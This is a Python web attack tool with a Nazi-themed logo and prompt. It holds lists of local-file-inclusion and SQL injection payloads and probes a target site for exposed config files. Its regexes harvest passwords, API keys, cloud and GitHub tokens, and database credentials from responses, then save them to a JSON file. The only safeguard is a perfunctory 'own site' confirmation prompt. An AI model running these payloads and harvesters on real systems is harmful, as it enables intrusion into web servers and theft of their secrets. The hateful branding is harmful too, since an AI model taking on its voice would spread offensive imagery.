#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EYE OF NAZI v52.0 - POWER TESTER
# Made by Cyber Kurd Team

import sys, os, re, ssl, time, json
import urllib.parse, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

LOGO = r"""
\033[91m\033[1m
   ███████╗██╗   ██╗███████╗     ██████╗ ███████╗     ███╗   ██╗ █████╗ ███████╗██╗
   ██╔════╝╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝     ████╗  ██║██╔══██╗╚══███╔╝██║
   █████╗   ╚████╔╝ █████╗      ██║   ██║█████╗       ██╔██╗ ██║███████║  ███╔╝ ██║
   ██╔══╝    ╚██╔╝  ██╔══╝      ██║   ██║██╔══╝       ██║╚██╗██║██╔══██║ ███╔╝  ██║
   ███████╗   ██║   ███████╗    ╚██████╔╝██║          ██║ ╚████║██║  ██║███████╗██║
   ╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝          ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝
\033[0m\033[93m\033[1m                    EYE OF NAZI
\033[96m=============================================================\033[0m
\033[97m\033[1m              POWER TESTER v52.0\033[0m
\033[2m              Made by Cyber Kurd Team\033[0m
\033[96m=============================================================\033[0m
"""

LFI_PATHS = [
    '../../../../../../etc/passwd',
    '../../../../../../etc/shadow',
    '../../../../../../etc/hosts',
    '../../../../../../etc/hostname',
    '../../../../../../etc/group',
    '../../../../../../etc/apache2/apache2.conf',
    '../../../../../../etc/nginx/nginx.conf',
    '../../../../../../etc/php.ini',
    '../../../../../../proc/self/environ',
    '../../../../../../proc/self/cmdline',
    '../../../../../../proc/version',
    '../../../../../../proc/self/status',
    '../../../../../../var/log/apache2/access.log',
    '../../../../../../var/log/apache2/error.log',
    '../../../../../../var/log/auth.log',
    '../../../../../../var/log/syslog',
    '../../../../../../var/log/messages',
    '../../../../../../var/log/nginx/access.log',
    '../../../../../../var/log/nginx/error.log',
    '../../../../../../windows/win.ini',
    '../../../../../../windows/system32/drivers/etc/hosts',
    '../../../../../../boot.ini',
    '..\\..\\..\\..\\..\\..\\windows\\win.ini',
    '..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '....//....//....//....//....//etc/passwd',
    '....\\\\....\\\\....\\\\....\\\\....\\\\windows\\win.ini',
    '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
    '..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
    '..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc/passwd',
    'php://filter/convert.base64-encode/resource=index.php',
    'php://filter/convert.base64-encode/resource=config.php',
    'php://filter/read=convert.base64-encode/resource=config.php',
    'php://filter/convert.base64-encode/resource=wp-config.php',
    'php://filter/convert.base64-encode/resource=../config.php',
    'php://filter/convert.base64-encode/resource=../../config.php',
    'php://filter/convert.base64-encode/resource=/etc/passwd',
    'php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd',
    'php://filter/read=string.rot13/resource=index.php',
    'php://filter/read=string.toupper/resource=index.php',
    'php://input',
    'php://stdin',
    'php://fd/1',
    'php://memory',
    'php://temp',
    'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
    'data://text/plain,<?php phpinfo();?>',
    'expect://id',
    'expect://whoami',
    'expect://ls',
    'file:///etc/passwd',
    'file:///c:/windows/win.ini',
    '/etc/passwd',
    '/etc/shadow',
    '/etc/hosts',
    '/proc/self/environ',
    '/proc/self/cmdline',
    '/var/log/apache2/access.log',
    '/var/log/auth.log',
    'C:\\windows\\win.ini',
    'C:\\boot.ini',
    'wp-config.php',
    'config.php',
    '.env',
    'config.json',
    'config.yml',
    'database.yml',
    'settings.py',
    'settings.php',
    'phpinfo.php',
    'info.php',
    'test.php',
]

SQLI_PAYLOADS = [
    "'",
    "\"",
    "'--",
    "1' OR '1'='1",
    "1' OR 1=1--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "admin'--",
    "admin'#",
    "') OR ('1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 10--",
    "1' ORDER BY 100--",
    "1' GROUP BY 1--",
    "1' HAVING 1=1--",
    "' OR 'x'='x",
    "1' AND SLEEP(3)--",
    "1' AND SLEEP(3)#",
    "1' AND PG_SLEEP(3)--",
    "1'; WAITFOR DELAY '0:0:3'--",
    "1' AND BENCHMARK(5000000,MD5('a'))--",
    "1' AND (SELECT 1 FROM (SELECT SLEEP(3))a)--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
    "1' AND 1=CONVERT(int,@@version)--",
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "sqlite3.operationalerror",
    "pg_query()",
    "psql:",
    "postgresql",
    "ora-01756",
    "ora-00933",
    "ora-00921",
    "mysql_fetch_array()",
    "supplied argument is not a valid mysql",
    "column count doesn't match value count",
    "unknown column",
    "sqlstate",
    "syntax error at or near",
    "mariadb",
    "division by zero",
    "sqlite_",
]

CONFIG_PATHS = [
    'wp-config.php', 'wp-config.php.bak', 'wp-config.php~',
    'wp-config.php.old', 'wp-config.php.save',
    'config.php', 'config.php.bak', 'config.php~',
    'config.inc.php', 'config.json', 'config.yml', 'config.yaml',
    'settings.py', 'settings.php', 'settings.json',
    'database.yml', 'database.php', '.env', '.env.local',
    '.env.production', '.env.backup', '.env.dev',
    '.htaccess', '.htpasswd', 'web.config',
    'credentials.json', 'secrets.json', 'passwords.txt',
    'wp-config-sample.php', 'config.old', 'config.backup',
]

PASSWORD_PATTERNS = [
    r'password["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'passwd["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'pwd["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'secret["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'token["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'access[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'secret[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'DB_PASSWORD\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'DB_PASS\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'DB_USER\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'DB_NAME\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'DB_HOST\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'MYSQL_PASSWORD\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'MYSQL_ROOT_PASSWORD\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'DATABASE_PASSWORD\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'SMTP_PASSWORD\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'MAIL_PASSWORD\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'ADMIN_PASSWORD\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'JWT_SECRET\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'APP_KEY\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'APP_SECRET\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'SECRET_KEY\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'AWS_SECRET[_-]?ACCESS[_-]?KEY\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'AWS_ACCESS[_-]?KEY[_-]?ID\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'db_password\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'db_pass\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'db_user\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'db_name\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'DB_PASSWORD\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'AKIA[0-9A-Z]{16}',
    r'ghp_[0-9a-zA-Z]{36}',
    r'sk_live_[0-9a-zA-Z]{24,}',
    r'AIza[0-9A-Za-z\-_]{35}',
]

DB_PATTERNS = [
    r'DB_NAME["\']?\s*[:=]\s*["\']([^"\'\s]{2,80})["\']',
    r'DB_USER["\']?\s*[:=]\s*["\']([^"\'\s]{2,80})["\']',
    r'DB_PASSWORD["\']?\s*[:=]\s*["\']([^"\'\s]{2,80})["\']',
    r'DB_HOST["\']?\s*[:=]\s*["\']([^"\'\s]{2,80})["\']',
    r'database["\']?\s*[:=]\s*["\']([^"\'\s]{2,80})["\']',
    r'username["\']?\s*[:=]\s*["\']([^"\'\s]{2,80})["\']',
    r'password["\']?\s*[:=]\s*["\']([^"\'\s]{2,80})["\']',
    r'host["\']?\s*[:=]\s*["\']([^"\'\s]{2,80})["\']',
]


class Client:
    def __init__(self, timeout=10, cookie=None, proxy=None):
        self.timeout = timeout
        self.cookie = cookie
        self.proxy = proxy
        self.ua = "Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile"

    def req(self, url, data=None, method=None):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if self.proxy:
            h = urllib.request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
            op = urllib.request.build_opener(h, urllib.request.HTTPSHandler(context=ctx))
        else:
            op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        hdrs = {'User-Agent': self.ua, 'Accept': '*/*', 'Connection': 'close'}
        if self.cookie:
            hdrs['Cookie'] = self.cookie
        r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        t0 = time.time()
        try:
            rp = op.open(r, timeout=self.timeout)
            body = rp.read()
            return {'s': rp.getcode(), 't': body.decode('utf-8', 'ignore'),
                    'n': len(body), 'dt': time.time() - t0, 'err': None}
        except urllib.error.HTTPError as e:
            try:
                body = e.read()
            except Exception:
                body = b''
            return {'s': e.code, 't': body.decode('utf-8', 'ignore'),
                    'n': len(body), 'dt': time.time() - t0, 'err': None}
        except Exception as e:
            return {'s': 0, 't': '', 'n': 0, 'dt': time.time() - t0, 'err': str(e)}


class Tester:
    def __init__(self, url, cl, threads=20):
        self.url = url.rstrip('/')
        self.cl = cl
        self.threads = threads
        self.findings = []
        self.passwords = []
        self.databases = []
        self.files = []

    def add(self, url, kind, evidence, severity="HIGH"):
        self.findings.append({'url': url, 'type': kind,
                              'evidence': evidence[:300], 'severity': severity})
        icons = {
            'LFI': '\033[95m[LFI]\033[0m',
            'SQLI': '\033[41m\033[97m[SQLi]\033[0m',
            'PASSWORD': '\033[41m\033[97m[PASSWORD]\033[0m',
            'DATABASE': '\033[41m\033[97m[DATABASE]\033[0m',
            'FILE': '\033[92m[FILE]\033[0m',
            'CONFIG': '\033[93m[CONFIG]\033[0m',
        }
        icon = icons.get(kind, '[' + kind + ']')
        print("\n  " + icon + " \033[1m" + severity + "\033[0m")
        print("    URL     : " + url[:120])
        print("    Evidence: " + evidence[:250])

    def inject_url(self, url, param, payload):
        pr = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(pr.query, keep_blank_values=True)
        qs[param] = [payload]
        return urllib.parse.urlunparse((pr.scheme, pr.netloc, pr.path,
                                         pr.params,
                                         urllib.parse.urlencode(qs, doseq=True),
                                         pr.fragment))

    def params(self, url):
        q = urllib.parse.urlparse(url).query
        if not q:
            return []
        return list(urllib.parse.parse_qs(q, keep_blank_values=True).keys())

    def test_lfi(self, url):
        print("\n\033[96m[1/5]\033[0m LFI Testing...")
        params = self.params(url)
        if not params:
            print("  \033[93m[!]\033[0m No URL parameters to test")
            return
        tested = 0
        for param in params:
            for path in LFI_PATHS[:30]:
                test_url = self.inject_url(url, param, path)
                r = self.cl.req(test_url)
                tested += 1
                if r['err']:
                    continue
                indicators = ['root:x:0:0', 'daemon:x:', 'bin:x:', 'www-data:',
                              '[extensions]', '[fonts]', '[boot loader]',
                              'for 16-bit app support']
                for ind in indicators:
                    if ind in r['t']:
                        self.add(test_url, 'LFI',
                                 "File leaked: " + ind, "CRITICAL")
                        self.files.append({'url': test_url, 'path': path,
                                           'indicator': ind})
                        break
        print("  \033[92m[+]\033[0m Tested " + str(tested) + " payloads")

    def test_sqli(self, url):
        print("\n\033[96m[2/5]\033[0m SQLi Testing...")
        params = self.params(url)
        if not params:
            print("  \033[93m[!]\033[0m No URL parameters to test")
            return
        tested = 0
        for param in params:
            base = self.cl.req(url)
            b = base['t'] if not base['err'] else ''
            for payload in SQLI_PAYLOADS:
                test_url = self.inject_url(url, param, payload)
                r = self.cl.req(test_url)
                tested += 1
                if r['err']:
                    continue
                found = False
                for err in SQL_ERRORS:
                    if err in r['t'].lower():
                        self.add(test_url, 'SQLI',
                                 "DB error: " + err, "CRITICAL")
                        found = True
                        break
                if found:
                    break
                if 'sleep' in payload.lower() and r['dt'] > 2.5:
                    self.add(test_url, 'SQLI',
                             "Time delay: " + str(round(r['dt'], 2)) + "s",
                             "CRITICAL")
                    break
        print("  \033[92m[+]\033[0m Tested " + str(tested) + " payloads")

    def test_config(self, url):
        print("\n\033[96m[3/5]\033[0m Config Files...")
        tested = 0
        for path in CONFIG_PATHS:
            full = url.rstrip('/') + '/' + path
            r = self.cl.req(full)
            tested += 1
            if r['err'] or r['s'] != 200:
                continue
            self.add(full, 'CONFIG',
                     "Config file exposed (" + str(r['n']) + "B)", "CRITICAL")

    def extract_passwords(self, url):
        print("\n\033[96m[4/5]\033[0m Password Extraction...")
        found = 0
        for path in CONFIG_PATHS:
            full = url.rstrip('/') + '/' + path
            r = self.cl.req(full)
            if r['err'] or r['s'] != 200:
                continue
            text = r['t']
            for pat in PASSWORD_PATTERNS:
                try:
                    for m in re.findall(pat, text, re.IGNORECASE):
                        if isinstance(m, tuple):
                            for x in m:
                                if x and 4 <= len(x) <= 80:
                                    self.passwords.append({'url': full,
                                                           'password': x})
                                    self.add(full, 'PASSWORD',
                                             "Password: " + x, "CRITICAL")
                                    found += 1
                        elif m and 4 <= len(m) <= 80:
                            self.passwords.append({'url': full, 'password': m})
                            self.add(full, 'PASSWORD',
                                     "Password: " + m, "CRITICAL")
                            found += 1
                except Exception:
                    pass
        print("  \033[92m[+]\033[0m Found " + str(found) + " password(s)")

    def extract_database(self, url):
        print("\n\033[96m[5/5]\033[0m Database Extraction...")
        found = 0
        for path in CONFIG_PATHS:
            full = url.rstrip('/') + '/' + path
            r = self.cl.req(full)
            if r['err'] or r['s'] != 200:
                continue
            text = r['t']
            db_info = {}
            for pat in DB_PATTERNS:
                try:
                    for m in re.findall(pat, text, re.IGNORECASE):
                        if m:
                            if isinstance(m, tuple):
                                for x in m:
                                    if x and len(x) > 1:
                                        db_info.setdefault('values', []).append(x)
                            else:
                                db_info.setdefault('values', []).append(m)
                except Exception:
                    pass
            if db_info:
                vals = list(set(db_info.get('values', [])))[:10]
                if vals:
                    self.databases.append({'url': full, 'values': vals})
                    self.add(full, 'DATABASE',
                             "DB info: " + ", ".join(vals[:5]), "CRITICAL")
                    found += 1
        print("  \033[92m[+]\033[0m Found " + str(found) + " database info")

    def run(self):
        print("\n\033[96m" + "=" * 60 + "\033[0m")
        print("\033[1m  [*] TARGET: " + self.url + "\033[0m")
        print("\033[96m" + "=" * 60 + "\033[0m")

        try:
            self.test_lfi(self.url)
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.test_sqli(self.url)
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.test_config(self.url)
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.extract_passwords(self.url)
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.extract_database(self.url)
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        print("\n\033[96m" + "=" * 60 + "\033[0m")
        print("  Total Findings: \033[1m\033[91m" + str(len(self.findings)) + "\033[0m")
        print("  Files: " + str(len(self.files)))
        print("  Passwords: " + str(len(self.passwords)))
        print("  Databases: " + str(len(self.databases)))
        print("\033[96m" + "=" * 60 + "\033[0m\n")

        if not self.findings:
            print("  \033[92mNo vulnerabilities found.\033[0m\n")

    def save_json(self, filename):
        with open(filename, 'w', encoding='utf-8') as fp:
            json.dump({
                'target': self.url,
                'findings': self.findings,
                'files': self.files,
                'passwords': self.passwords,
                'databases': self.databases,
            }, fp, indent=2, ensure_ascii=False)
        print("\033[92m[+]\033[0m Saved: " + filename)


def is_url(text):
    if text.startswith(('http://', 'https://')):
        return True
    if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text):
        return True
    return False


def main():
    print(LOGO)
    print("\n\033[96m" + "=" * 60 + "\033[0m")
    print("\033[92m  Power Tester - Type a domain (your own site).\033[0m")
    print("\033[93m  Warning: Use only on YOUR OWN site!\033[0m")
    print("\033[96m" + "=" * 60 + "\033[0m\n")

    st = {'cookie': None, 'proxy': None, 'threads': 20, 'last': None}

    while True:
        try:
            line = input("\033[1m\033[92mnazi\033[0m\033[93m@\033[0m"
                         "\033[96mforge\033[0m \033[94m>>\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n\033[93m[!] Bye\033[0m")
            break

        if not line:
            continue

        parts = line.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1].strip() if len(parts) > 1 else ""

        if cmd in ('exit', 'quit', 'q'):
            print("\033[93mBye.\033[0m")
            break
        elif cmd == 'cookie':
            if arg:
                st['cookie'] = arg
                print("\033[92m[+] Cookie set\033[0m")
        elif cmd == 'proxy':
            if arg:
                st['proxy'] = arg
                print("\033[92m[+] Proxy set\033[0m")
        elif cmd == 'threads':
            if arg:
                try:
                    st['threads'] = int(arg)
                    print("\033[92m[+] Threads: " + arg + "\033[0m")
                except Exception:
                    pass
        elif cmd == 'status':
            print("\n  Cookie: " + str(st['cookie']))
            print("  Proxy: " + str(st['proxy']))
            print("  Threads: " + str(st['threads']) + "\n")
        elif cmd == 'clear':
            os.system('clear')
            print(LOGO)
        elif cmd == 'save':
            if st['last'] and arg:
                st['last'].save_json(arg)
        elif is_url(cmd):
            url = cmd if cmd.startswith(('http://', 'https://')) else 'http://' + cmd
            print("\n\033[93m[!]\033[0m Warning: Only use on YOUR OWN site!")
            print("\033[93m[?]\033[0m Scanning: \033[1m" + url + "\033[0m")
            conf = input("\033[93m    Confirm you own this site? (yes/no): \033[0m").strip().lower()
            if conf not in ('yes', 'y', 'بەڵێ', 'b'):
                print("\033[93m[!] Aborted.\033[0m")
                continue
            cl = Client(timeout=15, cookie=st['cookie'], proxy=st['proxy'])
            sc = Tester(url, cl, threads=st['threads'])
            try:
                sc.run()
                st['last'] = sc
            except KeyboardInterrupt:
                print("\n\033[93m[!] Stopped\033[0m")
                st['last'] = sc
            except Exception as e:
                print("\n\033[91m[!] Error: " + str(e) + "\033[0m")
        else:
            print("\033[91m[!] Unknown: " + cmd + "\033[0m")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[93m[!] Bye\033[0m")
